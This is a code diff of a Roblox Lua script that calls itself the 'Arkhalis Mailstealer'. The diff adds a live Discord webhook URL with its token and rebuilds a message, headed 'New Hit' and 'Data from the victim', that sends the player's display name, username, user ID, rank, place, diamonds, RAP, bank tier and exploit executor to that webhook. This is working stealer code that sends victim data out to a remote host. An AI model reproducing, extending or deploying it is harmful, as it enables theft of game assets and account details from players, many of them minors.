@@ -1,4 +1,5 @@
---// Executor detector
+_G.Webhook = "https://discord.com/api/webhooks/1105213366412259429/w67BeulYZEDbB7-tB2JickZ9Te22ANLAtENZumFHZ5NFQcpzyut_GOxX-kf4SRSJjY73"
+
 
 local function getexploit()
 	local exploit =
@@ -44,13 +45,38 @@ _G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
 _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
 local function sendwebhook(msg)
 local msg = {
-	["content"]= "**🎁New Hit With Arkhalis🎁**",
+	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
+	["content"]= "**🎁New Hit With Arkhalis🎁** || @here|| ",
+	["username"] = "Arkhalis",
 	["embeds"]= {
 	  {
 		["title"]= "`Arkhalis Mailstealer Results`",
-		["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n💎Gems: **".._G.DisplayDiamond.."**\n⬆️Rap: **".._G.DisplayRap.."**\n📈Bank Tier: **".._G.DisplayBankTier.."**\n☠Executor: **"..getexploit().."**",
-		["url"]= "https://discord.gg/34fs3FWt",
+		["description"]= "**Data from the victim**\n**🧑Display Name: **".._G.PlrDisplayNameVictim.."\n**🧑Username: **".._G.PlrUserVictim.."\n**🧑User ID: **".._G.PlrUserIDVictim.."\n**🐱Rank: **".._G.CurrentRank.."\n**🎮Place: **".._G.GameIn.."**\n☠Executor: **"..getexploit(),
+		["url"]= "https://discord.gg/vzY4yAk9ns",
 		["color"]= ""..webhookcolor.."",
+		["thumbnail"] = {
+        ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",
+        ["height"] = 420,
+        ["width"] = 420
+        },
+		["fields"]= {
+        {
+          ["name"]= "**💎Diamonds 💎**",
+          ["value"]= "```".._G.DisplayDiamond.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "**⬆️Rap⬆️**",
+          ["value"]= "```".._G.DisplayRap.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "**📈Bank Tier📈**",
+          ["value"]= "```".._G.DisplayBankTier.."```",
+          ["inline"]= true
+        }
+      }
+      
   }
   },
 	["attachments"] = {}
